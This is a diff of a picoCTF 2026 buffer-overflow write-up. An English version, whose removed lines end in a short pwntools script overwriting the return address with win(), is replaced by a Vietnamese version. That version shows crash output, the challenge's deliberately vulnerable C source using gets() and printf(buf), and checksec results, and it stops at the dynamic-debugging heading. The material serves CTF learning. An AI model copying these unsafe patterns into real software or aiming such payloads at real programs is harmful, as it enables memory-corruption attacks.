@@ -1,78 +1,169 @@
 # PicoCTF 2026: Offset-Cycle
 
 **Category:** Binary Exploitation  |
-**Point:** 300 |
-**Solve:** 1,091 
+**Point:** 300 | **For Beginner**
 
-**Decription:** 
 > It's a race against time. Solve the binary exploit ASAP.
-Additional details will be available after launching your challenge instance.
 
-## Connection
 ```bash
 ssh -p <PORT> ctf-player@green-hill.picoctf.net
 # Password: password
 ```
-You need to access picoCTF 2026 to get port and password for this challenge!
+Bạn cần truy cập vào thử thách trên pico để mở instance
+## Tóm tắt
+Thử thách được tạo ra với một file binary cho phép tạo ra một file C và một file binary chính để chạy. Bên cạnh đó, giới hạn thời gian được áp dụng và được yêu cầu nhập một input chính xác để có được flag
 
-## Write-up
-### 1. Challenge Overview
-The challenge provides a remote SSH environment, containing ```start``` file to create a C file and a binary file
+Writeup này được viết bởi chillfish
 
-* Time: 120s to solve before deleting automatically
-* Target: Buffer Overflow to ```win()``` func to read flag
+## 1. Static Reversing
+### Chạy thử
+Khi chạy thử file binary được tạo, nó yêu cầu nhập string, với số lượng trong phạm vi buff nó sẽ mặc định nhảy tới 0x8049335, còn nếu tràn qua ret thì nhận input làm return address luôn
+```bash
+Please enter your string:
+99999999999999999999999999999999999999999999999
+Okay, time to return... Fingers Crossed... Jumping to 0x8049335
 
-### 2. **C file Analysis**
-After connected to server, we can run ```./start``` and read C file generated
-
-<img width="953" height="954" alt="image" src="https://github.com/user-attachments/assets/de5d2876-7ba6-4703-b8db-ec5c19043350" />
-
-Now, **C File**:
-* define a random buffer in each session
-* win() contains flag.txt
-* vuln() uses gets - which do not count number of digits we input
-
-=> This is a common Buffer Overflow vuln
-
-### 3. **Binary Analysis**
-
-<img width="605" height="233" alt="image" src="https://github.com/user-attachments/assets/759f90f6-85d0-477e-baa1-58aec78130a6" />
-
-Using ```checksec```, we know:
-* Architecture: i386
-* No PIE
-* No Canary
-
-### 4. **Exploitation Strategy**
-##### A. Finding offset
-We know that Buffer was pushed 95 byte, so offset will be around 95-115 bytes due to stack alignment ( Buffer size divides by 16 ) + Saved EBP (4 bytes)
-* ```pwn cyclic 150``` will help us 
-* Run in gdb find error address and calculating offset by ```cyclic -l address``` (It creates non-repeated 4 digits like baaa, caaa,... then when process is terminated, cycle will find the marked digit and give the offset from that)
-* 
-<img width="949" height="68" alt="image" src="https://github.com/user-attachments/assets/1e111a3c-f29c-407f-88df-c5bdd927ff1d" />
-
-<img width="940" height="408" alt="image" src="https://github.com/user-attachments/assets/a7c3ca2f-a4a5-4c36-9c8f-5e7397865ab6" />
-
--> 107 offset
-
-##### B. Finding Target
-Address to overwrite: ```win()```
-* Using ```print win``` in gdb
--> ```0x80491f6```
-
-### 5. **The Exploiting Script**
-* Script:
-```python
-from pwn import *
-p = process('./18')
-
-payload = b'a'*107 + p32(0x80491f6)
-
-p.sendline(payload) #sendline helps send last digits by /n (adapting to gets)
-p.interactive()
+Please enter your string:
+99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+Okay, time to return... Fingers Crossed... Jumping to 0x39393939
+Segmentation fault (core dumped)
 ```
-* Executing:
-  
-  <img width="937" height="275" alt="image" src="https://github.com/user-attachments/assets/ed2cb107-5b06-4225-a315-d681b50422f4" />
+### Hiểu code C
 
-Do it yourself and get your own flag
+<details>
+<summary>Bấm vào để xem full code</summary>
+  
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "CodeBank/asm.h"
+
+#define BUFSIZE 38
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("CodeBank/flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "You may not have plenty of time",
+                    "to solve the challenge.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+</details>
+
+Mấy dòng đầu là gọi hàm và file, cũng như khai báo kích thước của Buffer (Ngẫu nhiên với mỗi file được tạo ra mỗi session), flag thì cố định 64 bytes
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "CodeBank/asm.h"
+
+#define BUFSIZE 38
+#define FLAGSIZE 64
+```
+Tiếp theo là hàm đầu tiên được tạo, nó mở file flag và check xem liệu file còn tồn tại (trong giới hạn thời gian) không để ngắt
+Hai dòng cuối tôi sẽ giải thích cặn kẽ hơn:
+
+Hàm ```fgets(Nơi lưu, Số lượng đọc, Nơi đọc) có tác dụng đọc mỗi chuỗi kí tự```
+[Hiểu fgets](https://www.geeksforgeeks.org/c/fgets-function-in-c/)
+
+Nói chung nó sẽ đọc từ flag.txt theo kích thước của FLAGSIZE-1 vào biến buf (được gọi ở đoạn ```char buf[FLAGSIZE];```)
+
+Còn ```printf(buf)``` thì mắc một lỗi format strings nhưng do lệnh này ở hàm win và sau lệnh gọi flag nên không cần quan tâm nó nữa
+```C
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("CodeBank/flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "You may not have plenty of time",
+                    "to solve the challenge.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+```
+Hàm cuối này dùng hàm gets(), một hàm dùng để đọc dữ liệu được nhập vào, nhưng nó thiếu kiểm tra độ dài dữ liệu nên nó cho phép ta nhập vào một chuỗi dài hơn 38 bytes đã khai báo ở trên để ghi đè lên các vùng nhớ quan trọng như saved rbp hay return address
+
+[Hiểu gets](https://www.geeksforgeeks.org/c/gets-in-c/)
+
+Flow tiếp theo nó sẽ prinf ra return address của bài qua hàm ```get_return_address()```
+```C
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+```
+Đây là chương trình chính, phần thiết lập buffer này khiến tôi mất kha khá thời gian để hiểu
+
+Đoạn đầu với ```int main(int argc, char **argv){``` khai báo các tham số và vị trí để chương trình tìm đến và chạy đầu tiên
+
+```setvbuf(stdout, NULL, _IONBF, 0)```: là một cơ chế set buffer mode cho chương trình, ở đây dùng _IONF mode (I/O No Buffering), khi có chế độ này, các dữ liệu được truyền thẳng ra màn hình khi được sử dụng, thay vì đợi đầy buffer hoặc dùng các hàm đặc biệt nó mới hiện hết trên màn hình
+
+stdout: dữ liệu cần cấu hình | NULL: hệ thống tự xử lí con trỏ vùng đệm | _IONF: mode | 0: size buffer
+
+```gid_t gid = getegid()``` và ```setresgid(gid, gid, gid)```: Hiểu ngắn gọn thì nó sẽ set permission cho ta như người giữ flag, để tránh permission denied
+[Hiểu getegid](https://www.man7.org/linux/man-pages/man2/getgid.2.html)
+[Hiểu setresgid](https://linux.die.net/man/2/setresgid)
+
+Theo sau những hàm xử lý luồng dữ liệu là hàm ```puts()``` với nhiệm vụ in ra màn hình chuỗi được cấp. Kế đến gọi hàm ```vuln()``` để người dùng nhập stdin
+và rồi return 0; ngắt chương trình
+```C
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+### Check bảo mật
+```bash
+[*] '/home/ctf-player/21'
+    Arch:       i386-32-little                   -> Kiến trúc này saved ebp là 4 bytes
+    RELRO:      Partial RELRO
+    Stack:      No canary found                  -> Không có Canary, dễ dàng thay đổi return address
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)               -> Không thay đổi Offset mỗi lần chạy
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+```
+## 2. Dynamic Debugging
